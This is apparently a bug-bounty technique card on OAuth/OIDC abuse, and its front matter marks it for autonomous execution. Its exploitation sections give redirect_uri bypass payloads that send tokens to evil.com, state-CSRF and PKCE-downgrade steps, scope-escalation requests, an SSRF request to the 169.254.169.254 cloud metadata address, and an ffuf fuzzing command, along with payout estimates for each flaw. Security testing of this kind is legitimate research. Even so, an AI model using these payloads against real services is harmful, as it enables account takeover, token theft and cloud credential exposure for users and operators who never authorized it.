---
title: OAuth / OIDC Abuse
created: 2026-03-10
tags: [skills-learned, cyber, oauth]
type: technique
payout_ceiling: $25K–$100K (ATO, SSRF, privilege escalation)
auth_required: YES (public account self-registerable)
autonomy_level: EXECUTE
---

# OAuth / OIDC Abuse

## Concept

OAuth 2.0 = authorization framework. OIDC = identity layer on top. Misconfigurations allow account takeover, privilege escalation, SSRF, open redirect, and token theft.

**Key flows:**
- Authorization Code (+ PKCE) — web/mobile apps
- Implicit (deprecated, still present) — SPA legacy
- Client Credentials — M2M
- Device Authorization — IoT/CLI

**Why high value:**
- H1's highest-paying auth class (~$100K ceiling for ATO)
- Programs with SSO often have multiple OAuth flows
- PKCE downgrade = code interception = ATO without needing victim interaction

---

## Attack Surface Map

| Attack | Target | Impact |
|--------|--------|--------|
| redirect_uri bypass | Auth endpoint | Token theft → ATO |
| state param missing/ignored | Auth flow | CSRF → ATO |
| PKCE downgrade | Mobile/SPA | Code interception → ATO |
| scope escalation | Token request | Privilege escalation |
| token leakage via Referer | Implicit flow | Token theft |
| open redirect chain | redirect_uri | Phish + token steal |
| OIDC sub confusion | Account linking | ATO across identity providers |
| SSRF via request_uri | PAR endpoint | Internal SSRF |

---

## Detection & Reconnaissance

```bash
# Fetch OIDC discovery doc:
curl https://target.com/.well-known/openid-configuration | jq .
curl https://target.com/.well-known/oauth-authorization-server | jq .

# Get JWKS for JWT validation keys:
curl https://target.com/.well-known/jwks.json | jq .

# Decode access token:
echo "<access_token>" | cut -d. -f2 | base64 -d | jq .

# Token introspection (if exposed):
curl -X POST https://target.com/oauth/introspect \
  -d "token=<access_token>&client_id=x&client_secret=y"
```

---

## Exploitation

### redirect_uri bypass (whitelist escape)
```bash
# Whitelist bypass variants:
https://target.com/callback?redirect_uri=https://evil.com
https://target.com/callback?redirect_uri=https://target.com.evil.com
https://target.com/callback?redirect_uri=https://target.com/callback/../../../evil
https://target.com/callback?redirect_uri=https://target.com%2F@evil.com

# If server checks startsWith("https://target.com"):
https://target.com.evil.com        # subdomain spoof
https://target.com@evil.com        # userinfo abuse

# Fragment abuse (implicit flow):
redirect_uri=https://target.com/page#
# token lands in fragment, page leaks it to analytics/external scripts
```

### State CSRF (missing or not validated)
```bash
# 1. Start OAuth flow, copy auth URL
# 2. Remove state param (or use attacker's state in victim's browser)
# 3. Victim completes auth → code/token bound to attacker's session
# Validation: state present but not matched to session cookie = still vulnerable
```

### PKCE downgrade
```bash
# Intercept auth request:
# Remove: code_challenge + code_challenge_method params
# Intercept token request:
# Remove: code_verifier param
# If server accepts both → PKCE not enforced → code interception possible

# Authorization code interception scenario:
# 1. Victim initiates login
# 2. Attacker captures auth code (via referrer, open redirect, MITM on HTTP)
# 3. Attacker exchanges code for token (no PKCE = no binding)
```

### Scope escalation
```bash
# Original request:
scope=openid profile

# Tamper to:
scope=openid profile admin offline_access

# Check if server silently accepts broader scope
# Token introspect response will show actual granted scopes
```

### OIDC sub confusion / account linking ATO
```bash
# If app links accounts by email from OIDC token:
# 1. Register attacker-controlled IdP with victim's email as sub claim
# 2. App trusts email without verifying iss (issuer)
# → Attacker authenticates as victim across identity providers

# Test: create account with IdP 1, then link with IdP 2 using same email
# Check if app verifies iss + sub together (not email alone)
```

### request_uri SSRF (PAR - Pushed Authorization Requests)
```bash
GET /authorize?request_uri=https://169.254.169.254/latest/meta-data/ HTTP/1.1
# If server fetches request_uri → SSRF → potential IMDS access
```

---

## Tools & Terminal

```bash
# Burp Suite workflow:
# 1. Proxy entire OAuth flow
# 2. Map: client_id, redirect_uri, scope, state, response_type, code_challenge
# 3. Fuzz redirect_uri with open-redirect wordlist
# 4. Test state validation: intercept + swap state between two sessions

# Fuzz redirect_uri:
ffuf -u "https://target.com/authorize?client_id=X&redirect_uri=FUZZ&response_type=code" \
  -w /usr/share/seclists/Fuzzing/redirect-URL-bypass.txt \
  -fr "error" -mc 200,302

# OAuth Scanner (Burp extension — doyensec):
# BApp Store → OAuth Scanner → run on proxied auth flow

# Manual scope escalation test:
curl "https://target.com/authorize?client_id=X&scope=openid+admin&redirect_uri=https://target.com/cb&response_type=code"
```

---

## Bypass / Edge Cases

- Token binding (mTLS) — some implementations check certificate-bound tokens
- DPoP (Demonstrating Proof of Possession) — harder to steal/replay tokens
- `response_mode=form_post` vs `fragment` — different leakage vectors
- Refresh token rotation bypass — use old refresh token if rotation not enforced
- PKCE `S256` vs `plain` — downgrade to `plain` if server accepts it
- Device authorization flow — code polling endpoint may lack rate limiting

---

## Filing Guidance

**redirect_uri bypass → token theft:** High ($25K–$50K) — show full chain: bypass → stolen code → ATO
**State CSRF:** Medium ($10K–$25K) — requires victim interaction framing
**PKCE downgrade:** High ($25K+) — show code interception scenario
**Scope escalation:** Medium ($10K) — show elevated access in token response
**OIDC sub confusion → ATO:** Critical ($50K–$100K) — show two-IdP account takeover

Evidence required: Full HTTP trace from authorization request → token exchange → authenticated request with elevated access. Burp proxy history export ideal.

---

*OAuth / OIDC Abuse v1.0 | Ingested 2026-03-10 | Owner: cyber-operator*
